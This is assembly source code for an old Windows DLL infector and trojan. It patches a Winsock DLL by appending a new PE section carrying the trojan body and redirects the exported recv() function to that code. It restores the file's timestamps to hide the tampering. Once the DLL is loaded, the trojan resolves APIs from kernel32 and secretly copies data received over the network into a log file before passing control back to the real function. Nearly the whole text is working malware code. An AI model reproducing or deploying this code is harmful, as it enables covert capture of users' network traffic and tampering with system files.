   ;Coder:     BeLiAL

   ;Type:      Simple DLL Infector Example
   ;       This project was thought to hook some apis in the wsock.dll . It can
   ;       hook send() and recv() so that every sended string will be saved also
   ;       in a file called spy.txt . Buggy under wsock version 2.0

   ;BeLiAL 2002

   .386
   .model flat

   EXTRN ExitProcess:Proc
   EXTRN CreateFileA:Proc
   EXTRN GetFileSize:Proc
   EXTRN CreateFileMappingA:Proc
   EXTRN MapViewOfFile:Proc
   EXTRN CloseHandle:Proc
   EXTRN UnmapViewOfFile:Proc
   EXTRN SetFilePointer:Proc
   EXTRN SetEndOfFile:PROC
   EXTRN SetFileTime:Proc
   EXTRN GetFileTime:Proc
   EXTRN GetSystemDirectoryA:Proc
   EXTRN GetModuleFileNameA:Proc

   trojan_size       EQU offset trojan_end - offset trojan_begin

   .data

   filename        db 'ws2_23.dll',0
   filehandle      dd 0
   filemaphandle       dd 0
   mapaddress      dd 0
   filesize        dd 0
   section_alignment   dd 0
   file_alignment      dd 0
   ft1                 dd 0
                       dd 0
   ft2                 dd 0
                       dd 0
   ft3                 dd 0
                       dd 0
   sections        dw 0
   inf_api             db 'recv',0

   newsection:
                     db 'Redivide'
   ns_vi_size        dd 0
   ns_vi_addr        dd 0
   ns_ph_size        dd 0
   ns_ph_addr        dd 0
                     db 12 dup (0)
                     db 40h,0,0,0c0h

   .code

   start:

   push 0
   push 0
   push 3
   push 0
   push 1
   push 80000000h + 40000000h
   push offset filename
   call CreateFileA
   cmp eax,0ffffffffh
   jne make_the_map
   jmp exit_program

   make_the_map:
   mov dword ptr filehandle,eax

   push offset ft1
   push offset ft2
   push offset ft3
   push dword ptr filehandle
   call GetFileTime

   push 0
   push dword ptr filehandle
   Call GetFileSize

   mov dword ptr [filesize],eax
   mov ebx,eax

   push 0
   push ebx
   push 0
   push 4
   push 0
   push dword ptr filehandle
   call CreateFileMappingA
   mov dword ptr filemaphandle,eax

   push ebx
   push 0
   push 0
   push 2
   push eax
   call MapViewOfFile
   mov dword ptr mapaddress,eax

   cmp word ptr [eax+38h],'hS'
   jne infect_it
   jmp dont_infect

   infect_it:
   mov ebx,dword ptr [eax+3ch]
   add ebx,dword ptr mapaddress
   mov ax,word ptr [ebx]
   cmp ax,'EP'
   jne dont_infect
   mov eax,dword ptr mapaddress
   mov word ptr [eax+38h],'hS'

   mov eax,dword ptr [ebx+38h]
   mov dword ptr [section_alignment],eax
   mov eax,dword ptr [ebx+3ch]
   mov dword ptr [file_alignment],eax

   xor ecx,ecx
   mov cx,word ptr [ebx+6h]
   mov word ptr [sections],cx
   xor eax,eax
   mov ax,word ptr [ebx+14h]
   mov edx,ebx
   add edx,eax
   add edx,18h  ;now we are in front of the section tables

   push edx
   xor eax,eax
   xor edx,edx
   mov ax,word ptr [sections]
   mov ecx,00000028h
   mul ecx
   pop edx
   add eax,edx
   push eax     ;now we have stored the address after the section headers

   find_last_section:
   xor ecx,ecx
   push edx
   mov eax,dword ptr [edx+0ch]
   mov esi,1

   search_loop:
   add edx,28h
   cmp eax,dword ptr [edx+0ch]
   jnz bigger
   inc esi
   cmp si,word ptr [sections]
   je found_it
   jmp search_loop

   bigger:
   mov eax,dword ptr [edx+0ch]
   inc esi
   mov ecx,esi
   cmp si,word ptr [sections]
   je found_it
   jmp search_loop

   found_it:
   mov eax,28h
   dec ecx
   mul ecx
   pop edx
   add edx,eax     ;in edx is now the offset for the last section

   mov eax,dword ptr [edx+0ch]
   add eax,dword ptr [edx+10h]
   push edx
   xor edx,edx
   mov ecx,dword ptr [section_alignment]
   div ecx
   inc eax
   mul ecx
   pop edx
   mov dword ptr [ns_vi_addr],eax             ;sections virtual address

   mov dword ptr [ns_vi_size],trojan_size     ;sections real size is the trojan size

   mov eax,dword ptr [edx+14h]
   add eax,dword ptr [edx+10h]
   push edx
   xor edx,edx
   mov ecx,dword ptr [file_alignment]
   div ecx
   inc eax
   mul ecx
   pop edx
   mov dword ptr [ns_ph_addr],eax             ;sections physical offset is calculated

   mov eax,trojan_size
   mov ecx,dword ptr [section_alignment]
   push edx
   xor edx,edx
   div ecx
   mov ecx,dword ptr [section_alignment]
   sub ecx,edx
   pop edx
   mov eax,trojan_size
   add eax,ecx
   mov dword ptr [ns_ph_size],eax             ;sections virtual size is calculated
   pop edi
   sub edi,dword ptr [mapaddress]

   push dword ptr [mapaddress]                ;now we have to remap the file for correct increasing
   call UnmapViewOfFile

   push dword ptr [filemaphandle]
   call CloseHandle

   mov ebx,dword ptr [ns_ph_addr]
   add ebx,trojan_size

   push 0
   push ebx
   push 0
   push 4
   push 0
   push dword ptr filehandle
   call CreateFileMappingA
   mov dword ptr filemaphandle,eax

   push ebx
   push 0
   push 0
   push 2
   push eax
   call MapViewOfFile
   mov dword ptr mapaddress,eax        ;now a new file is mapped

   mov ebx,dword ptr [eax+3ch]
   add ebx,dword ptr [mapaddress]
   inc word ptr [ebx+6h]               ;add a new section

   mov eax,dword ptr [ns_vi_addr]
   add eax,dword ptr [ns_ph_size]
   mov dword ptr [ebx+50h],eax         ;virus size has to be added to the image size

   mov eax,dword ptr [mapaddress]
   mov dword ptr [kernel_base],eax

   push ebp
   xor ebp,ebp
   call get_table_entries
   mov eax,offset inf_api
   call Get_API
   sub eax,dword ptr [kernel_base]
   mov dword ptr [entry_point],eax
   mov eax,dword ptr [ns_ph_addr]
   mov dword ptr [ebx],eax
   pop ebp

   add edi,dword ptr [mapaddress]
   mov ecx,28h
   mov esi,offset newsection
   rep movsb                           ;new section is added

   mov edi,dword ptr [mapaddress]
   add edi,dword ptr [ns_ph_addr]
   mov esi,offset trojan_begin
   mov ecx,offset trojan_size
   rep movsb                           ;virus copied to file

   push dword ptr [mapaddress]
   call UnmapViewOfFile

   push dword ptr [filemaphandle]
   call CloseHandle

   push 0
   push 0
   mov eax,dword ptr [ns_ph_addr]
   add eax,trojan_size
   push eax
   push dword ptr [filehandle]
   call SetFilePointer
   jmp restore_file_time

   dont_infect:

   push dword ptr [mapaddress]
   call UnmapViewOfFile

   push dword ptr [filemaphandle]
   call CloseHandle

   push 0
   push 0
   mov eax,dword ptr [filesize]
   push eax
   push dword ptr [filehandle]
   call SetFilePointer

   restore_file_time:

   push dword ptr [filehandle]
   call SetEndOfFile

   push offset ft1
   push offset ft2
   push offset ft3
   push dword ptr filehandle
   call SetFileTime

   push dword ptr [filehandle]
   call CloseHandle

   exit_program:

   push 0
   call ExitProcess

   ;-----------------------------The Trojan begins here----------------------------

   trojan_begin:

   call delta_setup

   delta_setup:
   pop eax
   sub eax,offset delta_setup

   pushf
   push ebx
   push ecx
   push edx
   push esi
   push edi
   push ebp
   mov ebp,eax
   cmp dword ptr [ebp+firsttimerun],0
   jne main_part
   xor eax,eax
   mov eax,fs:[eax]

   search_last:                            ; scan the chain of SEHs
   mov edx,[eax]                           ;  to the last one which
   inc edx                                 ;  always will be in kernel32
   jz found_last
   dec edx
   xchg edx,eax
   jmp search_last

   found_last:
   mov eax,[eax+4]
   mov ax,0
   mov ecx,0

   try_new_offset:
   inc ecx
   cmp word ptr [eax],'ZM'
   je found_kernel_base
   cmp ecx,10
   je leave_virus
   sub eax,10000h
   jmp try_new_offset

   found_kernel_base:
   mov dword ptr [ebp+kernel_base],eax

   mov ebx,dword ptr [eax+3ch]
   add ebx,eax
   cmp word ptr [ebx],'EP'
   jne leave_virus
   call get_table_entries                          ;needs a value in kernel_base
   lea eax,[ebp+LoadLibrary_+4]
   call Get_API
   mov dword ptr [ebp+LoadLibrary_],eax
   lea eax,[ebp+GetProcAddress_+4]
   call Get_API                                    ;needs valid table entries
   mov dword ptr [ebp+GetProcAddress_],eax

   lea eax,[ebp+kernel32dll]
   call Ini_APIS

   lea eax,[ebp+user32dll]
   call Ini_APIS

   lea eax,[ebp+homedll]
   push eax
   call [ebp+GetModuleHandle_]
   add dword ptr [ebp+entry_point],eax

   main_part:

   lea eax,[esp+1ch]
   mov ecx,dword ptr [eax+0ch]
   mov ebx,dword ptr [eax+8h]
   push ecx

   push 0
   push 0
   push 4
   push 0
   push 0
   push 80000000h + 40000000h
   lea eax,[spyout+ebp]
   push eax
   call dword ptr [CreateFile_+ebp]
   cmp eax,-1
   jne open_the_file_now
   pop ecx
   jmp leave_virus

   open_the_file_now:
   mov dword ptr [ebp+filehandle_],eax
   push 0
   push eax
   call dword ptr [ebp+GetFileSize_]
   mov dword ptr [ebp+filesize_],eax
   pop ecx
   add eax,ecx
   push ecx
   add eax,2
   push eax

   push 0
   push eax
   push 0
   push 4
   push 0
   push dword ptr [ebp+filehandle_]
   call [ebp+CreateFileMapping_]
   mov dword ptr [ebp+maphandle_],eax

   push 0
   push 0
   push 2
   push eax
   call [ebp+MapViewOfFile_]
   mov dword ptr [ebp+mapaddress_],eax

   pop ecx
   mov esi,ebx
   mov edi,eax
   add edi,dword ptr [ebp+filesize_]
   repz movsb
   mov word ptr [edi],0a0dh

   push dword ptr [ebp+mapaddress_]
   call [ebp+UnmapViewOfFile_]

   push dword ptr [ebp+maphandle_]
   call [ebp+CloseHandle_]

   push dword ptr [ebp+filehandle_]
   call [ebp+CloseHandle_]

   leave_virus:
   inc dword ptr [ebp+firsttimerun]
   mov eax,dword ptr [ebp+entry_point]

   pop ebp
   pop edi
   pop esi
   pop edx
   pop ecx
   pop ebx
   popf
   jmp eax

   get_table_entries proc

   pushf
   pushad

   mov eax,dword ptr [ebp+kernel_base]
   mov ebx,dword ptr [eax+3ch]
   add eax,ebx                                         ;PE_header beginn is in eax
   mov ebx,dword ptr [eax+78h]                         ;go to exporttable
   add ebx,dword ptr [ebp+kernel_base]

   add ebx,1ch
   mov eax,dword ptr [ebx]
   add eax,dword ptr [ebp+kernel_base]
   mov [ebp+dword ptr Api_Adress_Table],eax

   add ebx,4
   mov eax,dword ptr [ebx]
   add eax,dword ptr [ebp+kernel_base]
   mov [ebp+dword ptr Api_Name_Table],eax

   add ebx,4
   mov eax,dword ptr [ebx]
   add eax,dword ptr [ebp+kernel_base]
   mov [ebp+dword ptr Api_Ordinary_Table],eax

   popad
   popf
   ret

   endp

   Get_API proc

   pushf
   push ecx
   push edx
   push edi
   push esi
   mov ebx,dword ptr [ebp+Api_Name_Table]
   mov ecx,0

   get_api_name:
   push ecx
   push eax
   mov esi,eax
   mov edi,dword ptr [ebx]
   add edi,dword ptr [ebp+kernel_base]
   mov eax,esi
   call get_string_lenght
   mov ecx,eax
   cld
   rep cmpsb
   pop eax
   pop ecx
   je found_api_name
   add ebx,4
   inc ecx
   jmp get_api_name

   found_api_name:                             ;ecx=ordinary number
   shl ecx,1
   add ecx,dword ptr [ebp+Api_Ordinary_Table]
   xor ebx,ebx
   mov bx,word ptr [ecx]
   shl ebx,2
   add ebx,dword ptr [ebp+Api_Adress_Table]
   mov eax,dword ptr [ebx]
   add eax,dword ptr [ebp+kernel_base]

   pop esi
   pop edi
   pop edx
   pop ecx
   popf
   ret

   endp

   get_string_lenght proc

   pushf
   push ecx
   mov ecx,1

   try_a_char:
   cmp byte ptr [eax],0
   je found_string_lenght
   inc ecx
   inc eax
   jmp try_a_char

   found_string_lenght:
   mov eax,ecx
   pop ecx
   popf
   ret

   endp

   Ini_APIS proc

   pushad
   push eax

   add eax,4
   push eax
   call [ebp+LoadLibrary_]
   pop ebx
   cmp eax,0
   je error_occured1
   mov dword ptr [ebx],eax
   lea eax,[ebx+4]
   call get_string_lenght
   add eax,ebx
   add eax,4

   ini_all_damn_apis:
   cmp byte ptr [eax],1
   je no_error_occured1
   push eax
   push ebx
   lea edx,[eax+4]
   push edx
   push dword ptr [ebx]
   call [ebp+GetProcAddress_]
   pop ebx
   pop edx
   cmp eax,0
   je error_occured1
   mov dword ptr [edx],eax
   add edx,4
   mov eax,edx
   call get_string_lenght
   add eax,edx
   jmp ini_all_damn_apis

   no_error_occured1:
   popad
   mov eax,1
   ret

   error_occured1:
   popad
   mov eax,0
   ret

   endp


   entry_point             dd 0
   kernel_base             dd 0
   Api_Name_Table          dd 0
   Api_Ordinary_Table      dd 0
   Api_Adress_Table        dd 0
   LoadLibrary_            dd 0
                           db 'LoadLibraryA',0
   GetProcAddress_         dd 0
                           db 'GetProcAddress',0
   mboxtext                db 'BeLiAL owns the file',0
   mboxtitle               db 'System Message',0
   homedll                 db 'wsock32.dll',0
   spyout                  db 'spyout.txt',0
   filehandle_             dd 0
   maphandle_              dd 0
   mapaddress_             dd 0
   filesize_               dd 0
   second_api              db 0

   kernel32dll             dd 0
                           db 'kernel32.dll',0
   CreateFile_             dd 0
                           db 'CreateFileA',0
   CloseHandle_            dd 0
                           db 'CloseHandle',0
   GetModuleHandle_        dd 0
                           db 'GetModuleHandleA',0
   GetFileSize_            dd 0
                           db 'GetFileSize',0
   CreateFileMapping_      dd 0
                           db 'CreateFileMappingA',0
   MapViewOfFile_          dd 0
                           db 'MapViewOfFile',0
   UnmapViewOfFile_        dd 0
                           db 'UnmapViewOfFile',0
   SetFilePointer_         dd 0
                           db 'SetFilePointer',0
   SetEndOfFile_           dd 0
                           db 'SetEndOfFile',0
                           db 1

   user32dll               dd 0
                           db 'user32.dll',0
   MessageBox_             dd 0
                           db 'MessageBoxA',0
                           db 1

   firsttimerun            dd 0

                           db 'The Hidden Sun Of Venus'

   trojan_end:

   end start
